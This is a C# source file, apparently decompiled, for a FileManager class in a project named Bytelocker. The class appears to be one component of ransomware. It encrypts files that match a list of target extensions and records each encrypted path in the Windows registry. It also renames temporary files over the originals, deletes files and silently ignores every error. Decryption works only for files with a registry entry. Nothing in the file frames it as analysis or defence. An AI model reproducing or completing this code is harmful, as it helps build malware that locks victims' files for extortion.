using System;
using System.IO;
using Bytelocker.Settings;

namespace Bytelocker.CryptoManager;

internal class FileManager
{
	private readonly FileEncrypter fe;

	private string file_path;

	private readonly RegistryManager rm;

	public FileManager()
	{
		fe = new FileEncrypter();
		rm = new RegistryManager();
	}

	public void ChooseFile(string file_path)
	{
		this.file_path = file_path;
	}

	public void DeleteFile()
	{
		try
		{
			File.Delete(file_path);
		}
		catch (Exception)
		{
		}
	}

	public void RenameTmpFileToOrig()
	{
		try
		{
			File.Move(file_path + FileEncrypter.FILE_EXTENSION_ENCRYPT_TMP, file_path);
		}
		catch (Exception)
		{
		}
	}

	public void SetupFileEncrypter()
	{
		fe.FetchPassword();
		fe.GenerateRandomSalt();
	}

	public void removeRegistryItem()
	{
		try
		{
			rm.DeleteValue(RegistryManager.FILES_KEY_NAME, file_path);
		}
		catch (ArgumentException)
		{
		}
	}

	public bool DecryptFile()
	{
		bool result = false;
		if (File.Exists(file_path) && !IsFileLocked(file_path) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, file_path) != "none")
		{
			result = true;
			fe.ChooseFile(file_path);
			fe.Decrypt();
			removeRegistryItem();
		}
		return result;
	}

	public bool EncryptFile()
	{
		bool result = true;
		string extension = Path.GetExtension(file_path);
		if (!IsFileLocked(file_path) && rm.ReadStringValue(RegistryManager.FILES_KEY_NAME, file_path) == "none" && FileEncrypter.FILE_EXTENSIONS_TO_ENCRYPT.Contains(extension.ToLower()))
		{
			fe.ChooseFile(file_path);
			fe.Encrypt();
			rm.CreateBoolValue(RegistryManager.FILES_KEY_NAME, file_path, value: true);
		}
		else
		{
			result = false;
		}
		return result;
	}

	public static bool IsFileLocked(string path)
	{
		FileStream fileStream = null;
		FileInfo fileInfo = new FileInfo(path);
		try
		{
			fileStream = fileInfo.Open(FileMode.Open, FileAccess.Write, FileShare.None);
		}
		catch (Exception)
		{
			return true;
		}
		finally
		{
			fileStream?.Close();
		}
		return false;
	}
}
